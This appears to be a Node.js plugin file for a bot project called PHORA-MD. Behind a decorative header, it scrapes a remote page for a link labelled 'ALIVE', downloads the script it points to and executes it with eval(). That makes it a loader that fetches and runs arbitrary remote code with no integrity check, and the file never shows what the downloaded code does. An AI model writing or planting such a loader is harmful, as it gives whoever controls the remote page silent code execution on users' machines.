//  [PHORA-MD]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Tristan                                  
//  >> Version: 1.0.0

const axios = require('axios');
const cheerio = require('cheerio');
const tristan7122 = require(__dirname + "/../config");

async function fetchALIVEUrl() {
  try {
    const response = await axios.get(tristan7122.PHORA_MD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("ALIVE")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('ALIVE not found 😭');
    }

    console.log('ALIVE loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchALIVEUrl();
